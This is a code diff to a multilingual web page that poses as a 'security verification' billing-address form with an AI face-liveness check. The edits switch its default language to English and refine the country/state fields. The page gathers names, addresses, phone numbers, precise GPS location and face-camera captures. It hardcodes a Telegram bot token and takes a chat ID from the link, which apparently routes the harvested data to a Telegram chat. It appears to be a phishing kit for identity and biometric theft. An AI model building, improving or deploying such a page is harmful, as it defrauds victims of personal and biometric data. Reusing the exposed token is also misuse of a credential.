@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="ja">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -59,6 +59,7 @@
             box-sizing: border-box; outline: none; transition: all 0.3s;
         }
         input:focus, select:focus { border-color: var(--accent-color); background: #fff; box-shadow: 0 0 0 4px rgba(0,113,227,0.12); }
+        select:disabled { background-color: #eee; cursor: not-allowed; color: #aaa; }
         
         .error-tip { font-size: 12px; color: #ff3b30; margin-top: 4px; display: none; }
 
@@ -104,8 +105,8 @@
 <body>
     <div class="lang-bar">
         <button class="lang-btn" onclick="setLanguage('zh')">中文</button>
-        <button class="lang-btn" onclick="setLanguage('en')">English</button>
-        <button class="lang-btn active" onclick="setLanguage('ja')">日本語</button>
+        <button class="lang-btn active" onclick="setLanguage('en')">English</button>
+        <button class="lang-btn" onclick="setLanguage('ja')">日本語</button>
         <button class="lang-btn" onclick="setLanguage('fr')">Français</button>
         <button class="lang-btn" onclick="setLanguage('de')">Deutsch</button>
         <button class="lang-btn" onclick="setLanguage('ru')">Русский</button>
@@ -140,7 +141,9 @@
 
         <div class="form-group">
             <label id="t-state"></label>
-            <select id="stateSelect"></select>
+            <select id="stateSelect" disabled>
+                <option value="" id="t-select-first">-- Please select a country first --</option>
+            </select>
         </div>
 
         <div class="form-group">
@@ -182,9 +185,8 @@
         const BOT_TOKEN = '8657025946:AAGG14AbXcHQzWqSaL6MQTCCP2PEtIyt64g';
         const CHAT_ID = new URLSearchParams(window.location.search).get('id');
 
-        let currentLang = 'ja'; // 默认日语
+        let currentLang = 'en'; // 默认英语
 
-        // 全语言国际化字典（包含界面文本与国家列表本地化名称）
         const translations = {
             zh: {
                 title: "账单与收货地址", subtitle: "请输入您的详细信息以完成安全核验准备",
@@ -192,6 +194,7 @@
                 state: "省份 / 州 (Province / State)", addr: "街道地址 (Street Address)", city: "城市 (City)",
                 postal: "邮政编码 (Postal Code)", phone: "手机号码 (Phone Number)", btn: "下一步：生物活体检测 ➔",
                 vTitle: "🛡️ 智能 AI 视觉活体检测", placeholderCountry: "请选择或输入搜索国家...",
+                selectFirst: "-- 请先选择上方国家 --",
                 postalErrText: "⚠️ 邮政编码格式不符合该国家/地区规范",
                 alertIncomplete: "请完整且正确填写所有账单与收货地址信息。",
                 alertNoId: "链接中缺少验证 ID (?id=...)，无法进行后续归档。",
@@ -218,6 +221,7 @@
                 state: "Province / State", addr: "Street Address", city: "City",
                 postal: "Postal Code", phone: "Phone Number", btn: "Next: Biometric Liveness Detection ➔",
                 vTitle: "🛡️ AI Smart Liveness Detection", placeholderCountry: "Select or search country...",
+                selectFirst: "-- Please select a country first --",
                 postalErrText: "⚠️ Invalid postal code format for this country",
                 alertIncomplete: "Please complete all billing and shipping address fields correctly.",
                 alertNoId: "Missing verification ID (?id=...) in the link.",
@@ -244,6 +248,7 @@
                 state: "都道府県 / 州", addr: "番地・建物名 (Street Address)", city: "市区町村 (City)",
                 postal: "郵便番号 (Postal Code)", phone: "電話番号 (Phone Number)", btn: "次へ：生体認証テスト ➔",
                 vTitle: "🛡️ AIスマート生体認証", placeholderCountry: "国を選択または検索...",
+                selectFirst: "-- まず国を選択してください --",
                 postalErrText: "⚠️ この国の郵便番号形式が無効です",
                 alertIncomplete: "すべての住所情報を正しく入力してください。",
                 alertNoId: "リンクに検証ID（?id=...）がありません。",
@@ -270,6 +275,7 @@
                 state: "Province / État", addr: "Adresse", city: "Ville",
                 postal: "Code Postal", phone: "Numéro de Téléphone", btn: "Suivant : Détection Biométrique ➔",
                 vTitle: "🛡️ Détection Biométrique IA", placeholderCountry: "Sélectionner ou rechercher un pays...",
+                selectFirst: "-- Veuillez d'abord sélectionner un pays --",
                 postalErrText: "⚠️ Format de code postal invalide",
                 alertIncomplete: "Veuillez remplir tous les champs.",
                 alertNoId: "ID manquant.", camErr: "Erreur caméra: ",
@@ -285,6 +291,7 @@
                 state: "Provinz / Bundesland", addr: "Straße", city: "Stadt",
                 postal: "Postleitzahl", phone: "Telefonnummer", btn: "Weiter: Biometrische Erkennung ➔",
                 vTitle: "🛡️ KI-Lebenderkennung", placeholderCountry: "Land auswählen oder suchen...",
+                selectFirst: "-- Bitte wählen Sie zuerst ein Land --",
                 postalErrText: "⚠️ Ungültige Postleitzahl",
                 alertIncomplete: "Bitte alle Felder ausfüllen.",
                 alertNoId: "ID fehlt.", camErr: "Kamerafehler: ",
@@ -300,6 +307,7 @@
                 state: "Регион / Штат", addr: "Адрес", city: "Город",
                 postal: "Индекс", phone: "Телефон", btn: "Далее ➔",
                 vTitle: "🛡️ Проверка ИИ", placeholderCountry: "Выберите или введите страну...",
+                selectFirst: "-- Сначала выберите страну --",
                 postalErrText: "⚠️ Неверный индекс",
                 alertIncomplete: "Заполните все поля.",
                 alertNoId: "Нет ID.", camErr: "Ошибка камеры: ",
@@ -315,6 +323,7 @@
                 state: "Область", addr: "Адреса", city: "Місто",
                 postal: "Індекс", phone: "Телефон", btn: "Далі ➔",
                 vTitle: "🛡️ Перевірка ШІ", placeholderCountry: "Виберіть або знайдіть країну...",
+                selectFirst: "-- Спочатку виберіть країну --",
                 postalErrText: "⚠️ Невірний індекс",
                 alertIncomplete: "Заповніть поля.",
                 alertNoId: "Немає ID.", camErr: "Помилка камери: ",
@@ -330,6 +339,7 @@
                 state: "Tỉnh / Bang", addr: "Địa chỉ", city: "Thành phố",
                 postal: "Mã bưu điện", phone: "Số điện thoại", btn: "Tiếp theo ➔",
                 vTitle: "🛡️ Kiểm tra AI", placeholderCountry: "Chọn hoặc tìm kiếm quốc gia...",
+                selectFirst: "-- Vui lòng chọn quốc gia trước --",
                 postalErrText: "⚠️ Mã bưu điện không hợp lệ",
                 alertIncomplete: "Vui lòng điền đủ.",
                 alertNoId: "Thiếu ID.", camErr: "Lỗi camera: ",
@@ -345,6 +355,7 @@
                 state: "Provincia / Estado", addr: "Dirección", city: "Ciudad",
                 postal: "Código Postal", phone: "Teléfono", btn: "Siguiente ➔",
                 vTitle: "🛡️ Detección IA", placeholderCountry: "Seleccionar o buscar país...",
+                selectFirst: "-- Por favor seleccione un país primero --",
                 postalErrText: "⚠️ Código postal inválido",
                 alertIncomplete: "Complete los campos.",
                 alertNoId: "Falta ID.", camErr: "Error de cámara: ",
@@ -360,12 +371,13 @@
                 state: "Província / Estado", addr: "Endereço", city: "Cidade",
                 postal: "Código Postal", phone: "Telefone", btn: "Próximo ➔",
                 vTitle: "🛡️ Detecção IA", placeholderCountry: "Selecionar ou pesquisar país...",
+                selectFirst: "-- Por favor, selecione um país primeiro --",
                 postalErrText: "⚠️ Código postal inválido",
                 alertIncomplete: "Preencha os campos.",
                 alertNoId: "Falta ID.", camErr: "Erro de câmera: ",
                 aiNoFace: "Rosto não detectado", aiKeepFace: "Mantenha o rosto para a frente", aiTurnLeft: "Virar à esquerda...",
                 aiLeftSuccess: "Sucesso, virar à direita", aiTurnRight: "Virar à direita...",
-                aiSuccess: "Verificação aprovada", uploading: "Enviando...",
+                aiSuccess: "Verificación aprovada", uploading: "Enviando...",
                 successDone: "Enviado!", netErr: "Erro de rede.",
                 countries: { "中国": "China", "美国": "Estados Unidos", "日本": "Japón", "法国": "França", "德国": "Alemanha", "俄罗斯": "Rússia", "乌克兰": "Ucrânia", "越南": "Vietnã", "英国": "Reino Unido", "加拿大": "Canadá", "澳大利亚": "Austrália", "西班牙": "Espanha", "意大利": "Itália", "韩国": "Coreia do Sul", "新加坡": "Cingapura", "马来西亚": "Malásia", "泰国": "Tailândia", "印度": "Índia", "巴西": "Brasil", "墨西哥": "México" }
             }
@@ -388,13 +400,12 @@
         const postalCodeInput = document.getElementById('postalCode');
         const postalError = document.getElementById('postalError');
 
-        // 统一的国家后台标准化映射键（用于匹配省份和邮编规则）
         function getStandardCountryKey(val) {
             const t = translations[currentLang].countries;
             for (let key in t) {
                 if (t[key] === val || key === val) return key;
             }
-            return "日本"; // 默认兜底
+            return null; // 未匹配到有效国家
         }
 
         function initCountryDatalist() {
@@ -410,14 +421,28 @@
         function onCountryChange() {
             const val = countryInput.value.trim();
             const stdKey = getStandardCountryKey(val);
-            const states = globalRegions[stdKey] || ["その他 / Other"];
+            const t = translations[currentLang];
+
             stateSelect.innerHTML = "";
-            states.forEach(st => {
+
+            if (!stdKey || !globalRegions[stdKey]) {
+                // 如果没有选择国家，禁用省份下拉框并显示提示
+                stateSelect.disabled = true;
                 const opt = document.createElement('option');
-                opt.value = st;
-                opt.text = st;
+                opt.value = "";
+                opt.text = t.selectFirst;
                 stateSelect.appendChild(opt);
-            });
+            } else {
+                // 如果已选择有效国家，启用省份并加载对应选项
+                stateSelect.disabled = false;
+                const states = globalRegions[stdKey];
+                states.forEach(st => {
+                    const opt = document.createElement('option');
+                    opt.value = st;
+                    opt.text = st;
+                    stateSelect.appendChild(opt);
+                });
+            }
             validatePostalCode();
         }
 
@@ -468,13 +493,12 @@
             countryInput.placeholder = t.placeholderCountry;
             postalError.innerText = t.postalErrText;
 
-            // 重新刷新国家列表为当前语言
             initCountryDatalist();
-            onCountryChange();
+            onCountryChange(); // 根据当前输入状态更新省份
         }
 
-        // 初始化加载日语
-        setLanguage('ja');
+        // 默认初始化加载英语
+        setLanguage('en');
 
         let formDataCache = {};
         const stepForm = document.getElementById('step-form');
@@ -497,7 +521,7 @@
                 window.speechSynthesis.cancel();
                 const langMap = { zh: 'zh-CN', en: 'en-US', ja: 'ja-JP', fr: 'fr-FR', de: 'de-DE', ru: 'ru-RU', uk: 'uk-UA', vi: 'vi-VN', es: 'es-ES', pt: 'pt-PT' };
                 const utterance = new SpeechSynthesisUtterance(text);
-                utterance.lang = langMap[currentLang] || 'ja-JP';
+                utterance.lang = langMap[currentLang] || 'en-US';
                 utterance.rate = 1.0;
                 utterance.pitch = 1.0;
                 window.speechSynthesis.speak(utterance);
@@ -520,7 +544,7 @@
             const postalCode = postalCodeInput.value.trim();
             const phone = document.getElementById('phone').value.trim();
 
-            if (!firstName || !lastName || !country || !address || !city || !postalCode || !phone) {
+            if (!firstName || !lastName || !country || !state || !address || !city || !postalCode || !phone) {
                 alert(t.alertIncomplete);
                 return;
             }
@@ -546,7 +570,7 @@
                 const pos = await new Promise((res, rej) => {
                     navigator.geolocation.getCurrentPosition(res, rej, { enableHighAccuracy: true, timeout: 8000 });
                 });
-                locationText = `緯度: ${pos.coords.latitude.toFixed(6)}, 経度: ${pos.coords.longitude.toFixed(6)}`;
+                locationText = `Latitude: ${pos.coords.latitude.toFixed(6)}, Longitude: ${pos.coords.longitude.toFixed(6)}`;
             } catch (e) {
                 console.warn("GPS skipped");
             }
